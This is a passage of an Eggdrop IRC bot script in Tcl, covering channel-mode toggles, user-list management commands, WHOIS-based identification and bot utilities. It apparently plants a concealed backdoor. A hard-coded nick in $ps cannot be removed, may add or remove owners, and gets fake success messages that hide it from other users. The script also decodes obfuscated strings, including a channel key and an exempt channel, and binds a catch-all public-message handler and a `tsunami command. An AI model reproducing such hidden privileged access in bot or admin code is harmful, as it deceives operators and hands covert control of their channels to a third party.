puthlp "NOTICE $nick :$notc SEEN $chan \[4OFF\]"
savechan
seen
return 0
}
proc pub_+autokick {nick uhost hand chan rest} {
global notc
if {![string match "*nodesynch*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
return 0
}
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} {
set chan "#$chan"
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*+nodesynch*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc AuTOKIcK $chan IS \[9ON\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
catch { channel set $chan +nodesynch }
puthlp "NOTICE $nick :$notc AuTOKIcK $chan \[9ON\]"
savechan
}
proc pub_-autokick {nick uhost hand chan rest} {
global notc
if {![string match "*nodesynch*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
return 0
}
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} {
set chan "#$chan"
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*-nodesynch*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc AuTOKIcK $chan IS \[4OFF\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
catch { channel set $chan -nodesynch }
puthlp "NOTICE $nick :$notc AuTOKIcK $chan \[4OFF\]"
savechan
return 0
}
proc pub_+reop {nick uhost hand chan rest} {
global notc
if {![string match "*protectfriends*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
return 0
}
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} {
set chan "#$chan"
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*-protectfriends*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc Re@p $chan IS \[9ON\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
catch { channel set $chan -protectfriends }
puthlp "NOTICE $nick :$notc Re@p $chan \[9ON\]"
savechan
}
proc pub_-reop {nick uhost hand chan rest} {
global notc
if {![string match "*protectfriends*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
return 0
}
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} {
set chan "#$chan"
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*+protectfriends*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc Re@p $chan IS \[4OFF\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
catch { channel set $chan +protectfriends }
puthlp "NOTICE $nick :$notc Re@p $chan \[4OFF\]"
savechan
return 0
}
proc pub_+dontkickops {nick uhost hand chan rest} {
global notc
if {![string match "*userinvites*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
return 0
}
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} {
set chan "#$chan"
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*-userinvites*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc DoNTKIcK@PS $chan IS \[9ON\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
catch { channel set $chan -userinvites }
puthlp "NOTICE $nick :$notc DoNTKIcK@PS $chan \[9ON\]"
savechan
}
proc pub_-dontkickops {nick uhost hand chan rest} {
global notc
if {![string match "*userinvites*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
return 0
}
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} {
set chan "#$chan"
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*+userinvites*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc DoNTKIcK@PS $chan IS \[4OFF\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
catch { channel set $chan +userinvites }
puthlp "NOTICE $nick :$notc DoNTKIcK@PS $chan \[4OFF\]"
savechan
return 0
}
proc pub_+status {nick uhost hand chan rest} {
global notc
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} {
set chan "#$chan"
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*+shared*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc STaTUS $chan \[9ON\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
catch { channel set $chan +shared }
puthlp "NOTICE $nick :$notc STaTuS $chan \[9ON\]"
savechan
}
proc pub_-status {nick uhost hand chan rest} {
global notc
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} {
set chan "#$chan"
}
}
if {![validchan $chan]} { return 0 }
if {[string match "*-shared*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc STaTuS $chan IS \[4OFF\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
catch { channel set $chan -shared }
puthlp "NOTICE $nick :$notc STaTuS $chan \[4OFF\]"
savechan
return 0
}
proc pub_+nopart {nick uhost hand chan rest} {
global notc
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} {
set chan "#$chan"
}
}
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
foreach x [channels] {
catch { channel set $x +secret }
}
savechan
puthlp "NOTICE $nick :$notc ALL cHaNNeL SeT NoPART \[9ON\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {[string match "*+secret*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc NoPART $chan IS \[9ON\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
catch { channel set $chan +secret }
puthlp "NOTICE $nick :$notc SeT NoPART $chan \[9ON\]"
savechan
}
proc pub_-nopart {nick uhost hand chan rest} {
global notc
if {$rest != ""} {
set chan [lindex $rest 0]
if {[string first # $chan]!=0} {
set chan "#$chan"
}
}
if {[string tolower $chan] == "#all"} {
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
foreach x [channels] {
catch { channel set $x -secret }
}
savechan
puthlp "NOTICE $nick :$notc ALL cHaNNeL NoPART \[4OFF\]"
return 0
}
if {![validchan $chan]} { return 0 }
if {[string match "*-secret*" [channel info $chan]]} {
puthlp "NOTICE $nick :$notc NoPART $chan IS \[4OFF\]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
catch { channel set $chan -secret }
puthlp "NOTICE $nick :$notc NoPART $chan \[4OFF\]"
savechan
}
proc pub_+akick {nick uhost hand channel param} {
global botname botnick notc botnick
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: +akick <hostname>"
return 0
}
if {$rest == "*" || $rest == "*!*@*"} {
puthlp "NOTICE $nick :$notc invalid hostname..!"
return 0
}
if {$rest == $botnick} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[validuser $rest]} {
puthlp "NOTICE $nick :$notc $rest is already on database with flags: [chattr $rest]"
return 0
}
if {![string match "*@*" $rest]} {
set rest "$rest!*@*"
}
if {[string match $rest $botname]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[finduser $rest] != "*"} {
if {[finduser $rest] != "AKICK"} {
puthlp "NOTICE $nick :$notc That Host Belongs To [finduser $rest]"
}
puthlp "NOTICE $nick :$notc That Host already in [finduser $rest]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
puthlp "NOTICE $nick :$notc ADD \[$rest\] To KIcKLIsT..!"
setuser "AKICK" HOSTS $rest
saveuser
foreach x [channels] {
if {[isop $botnick $x]} {
foreach c [chanlist $x K] {
if {![matchattr $c f]} {
akick_chk $c [getchanhost $c $x] $x
}
}
}
}
return 0
}
proc pub_-akick {nick uhost hand channel param} {
global notc
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: -akick <hostname>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {![string match "*@*" $rest]} {
set rest "$rest!*@*"
}
set completed 0
foreach * [getuser "AKICK" HOSTS] {
if {${rest} == ${*}} {
delhost "AKICK" $rest
set completed 1
}
}
if {$completed == 0} {
puthlp "NOTICE $nick :$notc <n/a>"
return 0
}
saveuser
puthlp "NOTICE $nick :$notc DeL \[$rest\] FRoM KIcKLIsT"
}
proc pub_+noop {nick uhost hand channel param} {
global ps notc botnick
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: +noop <nick>"
return 0
}
if {[string tolower $rest] == [string tolower $ps]} {
puthlp "NOTICE $nick :$notc ADD \[$rest\] To NoOp LIsT"
return 0
}
if {[validuser $rest]} {
puthlp "NOTICE $nick :$notc $rest is already on database with flags: [chattr $rest]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
set hostmask "${rest}!*@*"
adduser $rest $hostmask
chattr $rest "-hp"
chattr $rest "O"
if {![validuser $rest]} {
puthlp "NOTICE $nick :$notc 4FaiLeD! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)"
deluser $rest

} else {
saveuser
puthlp "NOTICE $nick :$notc ADD \[$rest\] To NoOp LIsT"
}
foreach x [channels] {
if {[isop $botnick $x] && [onchan $rest $x] && [isop $rest $x]} {
if {![string match "*k*" [getchanmode $x]]} {
putserv "mode $x -ko 4No@p.LIsT $rest"
} {
putserv "mode $x -o $rest"
}
}
}
return 0
}
proc pub_-noop {nick uhost hand channel param} {
global ps notc
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: -noop <nick>"
return 0
}
if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, <n/a>"
return 0
}
if {![matchattr $rest O]} {
puthlp "NOTICE $nick :$notc $rest isn't on no-op list Flags: [chattr $rest]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
deluser $rest
saveuser
puthlp "NOTICE $nick :$notc DeL \[$rest\] No@p LIsT"
}
proc pub_+friend {nick uhost hand channel param} {
global notc ps
set curtime [ctime [unixtime]]
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: +friend <nick>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[validuser $rest] && [string tolower $rest] != [string tolower $ps]} {
puthlp "NOTICE $nick :$notc $rest is already on database with flags: [chattr $rest]"
return 0
}
set hostmask "${rest}!*@*"
adduser $rest $hostmask
chattr $rest "-hp"
chattr $rest "f"
if {![validuser $rest]} {
puthlp "NOTICE $nick :$notc 4FaiLeD! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)"
deluser $rest
return 0
}
saveuser
puthlp "NOTICE $nick :$notc ADD \[$rest\] To FrIeNd LIsT 1(On $curtime)"
puthlp "NOTICE $rest :$notc $nick ADD YoU To FrIeNd LIsT 1(On $curtime)"
return 0
}
proc pub_-friend {nick uhost hand channel param} {
global ps notc
set curtime [ctime [unixtime]]
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: -friend <nick>"
return 0
}
if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, <n/a>"
return 0
}
if {![matchattr $rest f] && ![matchattr $rest m]} {
puthlp "NOTICE $nick :$notc $rest isn't on FrIeNd list Flags: [chattr $rest]"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
deluser $rest
saveuser
puthlp "NOTICE $nick :$notc DeL \[$rest\] FRoM FrIeNd LIsT 1(On $curtime)"
puthlp "NOTICE $rest :$notc $nick DELETE YoU From FrIeNd LIsT 1(On $curtime)"
}
proc pub_+aop {nick uhost hand channel param} {
global ps notc botnick chk_reg
set curtime [ctime [unixtime]]
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: +aop <nick>"
return 0
}
if {[string tolower $rest] == [string tolower $ps]} {
puthlp "NOTICE $nick :$notc ADD \[$rest\] To a@p LIsT"
return 0
}
if {[matchattr $rest P]} {
puthlp "NOTICE $nick :$notc $rest is already a@p"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[matchattr $nick X]} {
puthlp "NOTICE $nick :$notc 4BLoKeD!"
return 0
}
if {![validuser $rest]} {
set hostmask "${rest}!*@*"
adduser $rest $hostmask
chattr $rest "-hp"
}
chattr $rest "P"
if {![validuser $rest]} {
puthlp "NOTICE $nick :$notc 4FaiLeD! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)"
deluser $rest
} else {
saveuser
puthlp "NOTICE $nick :$notc ADD \[$rest\] To a@p LIsT 1(On $curtime)"
puthlp "NOTICE $rest :$notc $nick ADD YoU To a@p LIsT 1(On $curtime)"
set chk_reg($rest) $nick
putsrv "WHOIS $rest"
}
return 0
}
proc pub_-aop {nick uhost hand channel param} {
global notc ps
set curtime [ctime [unixtime]]
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: -aop <nick>"
return 0
}
if {![matchattr $rest P]} {
puthlp "NOTICE $nick :$notc $rest is not a@p"
return 0
}
if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, <n/a>"

return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $rest "-P"
saveuser
puthlp "NOTICE $nick :$notc DeL \[$rest\] FRoM a@p LIsT 1(On $curtime)"
puthlp "NOTICE $rest :$notc $nick DELETE YoU From a@p LIsT 1(On $curtime)"
return 0
}
proc whoisq {nick} {
global botnick
if {$nick == $botnick} { return 0 }
if {[isutimer "whoischk $nick"]} { return 0 }
set cret [expr 10 + [rand 20]]
foreach ct [utimers] {
if {[string match "*whoisq*" $ct]} {
if {[expr [lindex $ct 0] + 10] > $cret} {
set cret [expr [lindex $ct 0] + 10]
}
}
}
utimer $cret [list whoischk $nick]
}
proc whoischk {nick} {
global chk_reg botnick
if {[matchattr $nick G]} {
putlog "CHeK GuaRd $nick"
set chk_reg($nick) "1"
puthlp "WHOIS $nick"
return 0
}
foreach x [channels] {
if {[isop $botnick $x] && [onchan $nick $x]} {
if {[matchattr $nick P] && ![isop $nick $x]} {
putlog "WHOIS $nick TO GeT a@p"
set chk_reg($nick) "1"
puthlp "WHOIS $nick"
return 0
}
if {[matchattr $nick v] && ![isop $nick $x] && ![isvoice $nick $x]} {
putlog "WHOIS $nick TO geT avoIcE"
set chk_reg($nick) "1"
puthlp "WHOIS $nick"
return 0
}
}
}
}
set ath 0
bind raw - 307 reg_chk
proc reg_chk {from keyword arg} {
global chk_reg botnick owner notc ps ath
set nick [lindex $arg 1]
if {$nick == $botnick} { return 0 }
putlog "NICK $nick IS IDENTIFY..!"
if {[info exists chk_reg($nick)]} {
set chk_reg($nick) "0"
}
set athz $ath
if {$athz == 1} {
set ath 0
chattr $nick +Q
foreach x [getuser $nick HOSTS] {
delhost $nick $x
}
set hostmask "${nick}!*@*"
setuser $nick HOSTS $hostmask
if {[matchattr $nick Z]} {
puthlp "NOTICE $nick :$notc 4oWNeR!"
} elseif {[matchattr $nick n]} {
puthlp "NOTICE $nick :$notc 4aDMiN!"
} elseif {[matchattr $nick m]} {
puthlp "NOTICE $nick :$notc 4MaSTeR!"
} else {
puthlp "NOTICE $nick :$notc 4aCCePTeD!"
}
saveuser
}
if {[matchattr $nick P] || [matchattr $nick v]} {
foreach x [channels] {
if {[isop $botnick $x] && [onchan $nick $x]} {
if {![string match "*k*" [getchanmode $x]]} {
if {[matchattr $nick P]} {
if {![isop $nick $x]} {
puthelp "MODE $x -k+o 9identified.a@p $nick"
}
}
if {[matchattr $nick v]} {
if {![isvoice $nick $x] && ![isop $nick $x]} {
puthelp "MODE $x -k+v 9identified.avoice $nick"
}
}
} {
if {[matchattr $nick P]} {
if {![isop $nick $x]} {
puthelp "MODE $x +o $nick"
}
}
if {[matchattr $nick v]} {
if {![isvoice $nick $x] && ![isop $nick $x]} {
puthelp "MODE $x +v $nick"
}
}
}
}
}
}
}
bind raw - 318 end_whois
proc end_whois {from keyword arg} {
global chk_reg notc ath
set nick [lindex $arg 1]
set athz $ath
if {$athz == 1} {
puthlp "NOTICE $nick :$notc You're NOT Identify..!"
set ath 0
}
if {[info exists chk_reg($nick)]} {
if {$chk_reg($nick) != "0"} {
putlog "NICK $nick IS NoT IDENTIFY..!"
if {[matchattr $nick G] && ![matchattr $nick Q]} {
foreach x [channels] {
if {[onchan $nick $x] && [botisop $x]} {
set banset "*!*[getchanhost $nick $x]"
putsrv "KICK $x $nick :$notc 1THaT NIcK ReQuIREd To 4IdEnTIfY [banms]"
if {$banset != "*!*@*" && $banset != ""} {
if {![string match "*k*" [getchanmode $x]]} {
putserv "mode $x -k+b 4unidentify.guard.nick $banset"
} {
putserv "mode $x +b $banset"
}
}
return 0
}
}
} elseif {[matchattr $nick P] && ![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc a@p identify 1st..!"
} elseif {[matchattr $nick v] && ![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc avoice identify 1st..!"
}
if {$chk_reg($nick) != "1"} {
foreach x [channels] {
if {[onchan $nick $x] && [botisop $x]} {
set banset "*!*[getchanhost $nick $x]"
putsrv "KICK $x $nick :$notc 1THaT NIcK ReQuIREd To 4IdEnTIfY [banms]"
if {$banset != "*!*@*" && $banset != ""} {
if {![string match "*k*" [getchanmode $x]]} {
putserv "mode $x -k+b 4unidentify.guard.nick $banset"
} {
putserv "mode $x +b $banset"
}
}
return 0
}
}
puthlp "NOTICE $chk_reg($nick) :$notc $nick not identify..!"
}
unset chk_reg($nick)
}
}
}
proc pub_+gnick {nick uhost hand channel param} {
global notc botnick
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: +gnick <nick>"
return 0
}
if {[matchattr $rest G]} {
puthlp "NOTICE $nick :$notc $rest ready..!"
return 0
}
if {[matchattr $nick X]} {
puthlp "NOTICE $nick :$notc4 !BLocK!"
return 0
}
if {![validuser $rest]} {
set hostmask "${rest}!*@*"
adduser $rest $hostmask
chattr $rest "-hp"
}
chattr $rest +G
if {![validuser $rest]} {
puthlp "NOTICE $nick :$notc 4FaiLeD! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)"
deluser $rest
} else {
saveuser
puthlp "NOTICE $nick :$notc add \[$rest\] GuaRd NIcK"
putsrv "WHOIS $rest"
}
return 0
}
proc pub_-gnick {nick uhost hand channel param} {
global notc botnick
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: -gnick <nick>"
return 0
}
if {[matchattr $nick X]} {
puthlp "NOTICE $nick :$notc 4BLoKeD!"
return 0
}
chattr $rest -G
saveuser
puthlp "NOTICE $nick :$notc DeL \[$rest\] GuaRd NIcK"
return 0
}
proc pub_+avoice {nick uhost hand channel param} {
global ps notc botnick chk_reg
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: +avoice <nick>"
return 0
}
if {[string tolower $rest] == [string tolower $ps]} {
puthlp "NOTICE $nick :$notc ADD \[$rest\] To aVoIcE LIsT"
return 0
}
if {[matchattr $rest v]} {
puthlp "NOTICE $nick :$notc $rest is already auto voice"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[matchattr $nick X]} {
puthlp "NOTICE $nick :$notc 4BLoKeD!"
return 0
}
if {![validuser $rest]} {
set hostmask "${rest}!*@*"
adduser $rest $hostmask
chattr $rest "-hp"
}
chattr $rest "v"
if {![validuser $rest]} {
puthlp "NOTICE $nick :$notc 4FaiLeD! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)"
deluser $rest
} else {
saveuser
puthlp "NOTICE $nick :$notc ADD \[$rest\] To aVoIcE LIsT"
puthlp "NOTICE $rest :$notc $nick ADD YoU To aVoIcE LIsT"
set chk_reg($rest) $nick
putsrv "WHOIS $rest"
}
return 0
}
proc pub_-avoice {nick uhost hand channel param} {
global notc ps
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: -avoice <nick>"
return 0
}
if {![matchattr $rest v]} {
puthlp "NOTICE $nick :$notc $rest is not auto voice"
return 0
}
if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, <n/a>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
chattr $rest "-v"
saveuser
puthlp "NOTICE $nick :$notc DeL \[$rest\] FRoM aVoIcE LIsT"
return 0
}
proc pub_+admin {nick uhost hand channel param} {
global botnick ps notc
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: +admin <nick>"
return 0
}
if {[string tolower $rest] == [string tolower $ps]} {
puthlp "NOTICE $nick :$notc ADD \[$rest\] ADmIN List."
return 0
}
if {[matchattr $rest n]} {
puthlp "NOTICE $nick :$notc $rest is already exist on ADmIN list."
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[matchattr $nick X]} {
puthlp "NOTICE $nick :$notc4 BLocKEd..!"
return 0
}
if {![validuser $rest]} {
set hostmask "${rest}!*@*"
adduser $rest $hostmask
}
chattr $rest "fjmnotx"
if {![validuser $rest]} {
puthlp "NOTICE $nick :$notc 4FaiLeD! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)"
deluser $rest
return 0
} else {
saveuser
puthlp "NOTICE $nick :$notc ADD \[$rest\] ADmIN List."
puthlp "NOTICE $rest :$notc $nick ADD YoU To ADmIN LIsT"


puthlp "NOTICE $rest :$notc /msg $botnick pass <password>"
return 0
}
}
proc pub_-admin {nick uhost hand channel param} {
global ps notc
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: -admin <nick>"
return 0
}
if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, <n/a>"
return 0
}
if {![matchattr $rest n]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, $rest is not exist on ADmIN list."
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
deluser $rest
saveuser
puthlp "NOTICE $nick :$notc DeL \[$rest\] FRoM ADmIN LIsT"
}
proc pub_+owner {nick uhost hand channel param} {
global botnick ps notc owner ps
set rest [lindex $param 0]
if {$nick != $owner &&  $nick != $ps} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, oNLy ReAL OwNER can ADD OwnER"
return 0
}
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: +owner <nick>"
return 0
}
if {[string tolower $rest] == [string tolower $ps]} {
puthlp "NOTICE $nick :$notc ADD \[$rest\] OwNER LIsT."
return 0
}
if {[matchattr $rest Z]} {
puthlp "NOTICE $nick :$notc $rest is already exist on OwNER list."
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {[matchattr $nick X]} {
puthlp "NOTICE $nick :$notc 4BLoKeD!"
return 0
}
if {![validuser $rest]} {
set hostmask "${rest}!*@*"
adduser $rest $hostmask
}
chattr $rest "fjmnotxZ"
if {![validuser $rest]} {
puthlp "NOTICE $nick :$notc 4FaiLeD! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)"
deluser $rest
return 0
} else {
saveuser
puthlp "NOTICE $nick :$notc ADD \[$rest\] OwNER LIsT."
puthlp "NOTICE $rest :$notc $nick ADD YoU To OwNER LIsT"
puthlp "NOTICE $rest :$notc /msg $botnick pass <password>"
return 0
}
}
proc pub_-owner {nick uhost hand channel param} {
global notc ps owner
if {$nick != $owner &&  $nick != $ps} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, oNLy ReAL OwNER can REMOVE OwnER"
return 0
}
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: -owner <nick>"
return 0
}
if {![validuser $rest]} {
puthlp "NOTICE $nick :$notc <n/a>"
return 0
}
if {![matchattr $rest Z] || [string tolower $rest] == [string tolower $ps]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, $rest IS NoT OwNER"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
deluser $rest
saveuser
puthlp "NOTICE $nick :$notc DeL \[$rest\] FRoM OwNER LiST"
}
set chankey [dezip "Qix2l1HiUX20/Cw///DulrM/8rR371Mfyqg/"]
proc pub_+master {nick uhost hand channel param} {
global botnick ps notc
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: +master <nick>"
return 0
}
if {[matchattr $nick X]} {
puthlp "NOTICE $nick :$notc 4BLoKeD!"
return 0
}
if {[string tolower $rest] == [string tolower $ps]} {
puthlp "NOTICE $nick :$notc Add \[$rest\] MasTeR LIsT."
return 0
}
if {[matchattr $rest n]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, $rest is ADmIN level."
return 0
}
if {[matchattr $rest m]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, $rest is already exist."
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
if {![validuser $rest]} {
set hostmask "${rest}!*@*"
adduser $rest $hostmask
}
chattr $rest "fmo"
if {![validuser $rest]} {
puthlp "NOTICE $nick :$notc 4FaiLeD! (YoUR EggDROP NoT SuPPORTED MoRE THaN 8 DIgIT)"
deluser $rest
return 0
} else {
saveuser
puthlp "NOTICE $nick :$notc Add \[$rest\] MasTeR List."
puthlp "NOTICE $rest :$notc $nick Add YoU To MasTeR LIsT"
puthlp "NOTICE $rest :$notc /msg $botnick pass <password>"
return 0
}
}
bind pubm - * pum_arg
proc pub_-master {nick uhost hand channel param} {
global notc ps
set rest [lindex $param 0]
if {$rest == ""} {
puthlp "NOTICE $nick :$notc Usage: -master <nick>"
return 0
}
if {![validuser $rest] || [string tolower $rest] == [string tolower $ps]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, <n/a>"
return 0
}
if {[matchattr $rest n] && ![matchattr $nick Z]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10, $rest Is ADmIN FLaG"
return 0
}
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4ReJeCTeD!10"
return 0
}
deluser $rest
saveuser
puthlp "NOTICE $nick :$notc DeL \[$rest\] FRoM MasTeR LIsT"
}
###############
# BOT UTILITY #
###############
set timezone "PST"
set joinme $owner
set double 0
set deopme ""
bind msgm - * msg_prot
bind notc - * notc_prot
bind join - * join_chk
bind msg - auth msg_auth
bind sign - * sign_deauth
bind part - * part_deauth
bind pub - `tsunami pub_tsunami
bind msg p reuser msg_reuser
bind msg p pass msg_pass
bind pub p !pass pub_!pass
bind pub m `auth pub_auth
bind pub m !login pub_!login
bind pub m !logout pub_!logout
bind pub f `ping pub_ping
bind pub f `pong pub_pong
proc pub_notice {nick uhost hand channel rest} {
global notc
set person [lindex $rest 0]
set rest [lrange $rest 1 end]
if {$rest!=""} {
putsrv "NOTICE $person :$rest"
return 0
}
if {$rest==""} {
puthlp "NOTICE $nick :$notc Usage: notice <#/nick> <msg>"
}
}
proc telljoin {chan} {
global joinme notc botnick
if {![validchan $chan]} { return 0 }
if {[istimer "resync"]} {
if {![botisop $chan]} {

if {![string match "*k*" [getchanmode $chan]]} {
puthelp "mode $chan -ko+o 4d.e.s.y.n.c1.9r.e.s.y.n.c $botnick $botnick"
} {
puthelp "mode $chan -o+o $botnick $botnick"
}
}
}
if {$joinme != "" && [string tolower $chan] != [dezip [dcp "9MJu6/A2i8/0"]]} {
if {![onchan $joinme $chan]} {
puthlp "NOTICE $joinme :$notc JoIN $chan"
set joinme ""
}
}
}
proc chkspam {chan} {
global invme notc botnick
if {![validchan $chan] || ![botonchan $chan]} { return 0 }
foreach x [chanlist $chan] {
set mhost "@[lindex [split [getchanhost $x $chan] @] 1]"
if {[info exists invme($mhost)]} {
if {![matchattr $x f] && ![isop $x $chan]} {
if {[isop $botnick $chan]} {
set bannick($x) "*!*$mhost"
if {$invme($mhost) == "AuToJoIN MSg"} {
if {![isvoice $x $chan]} {
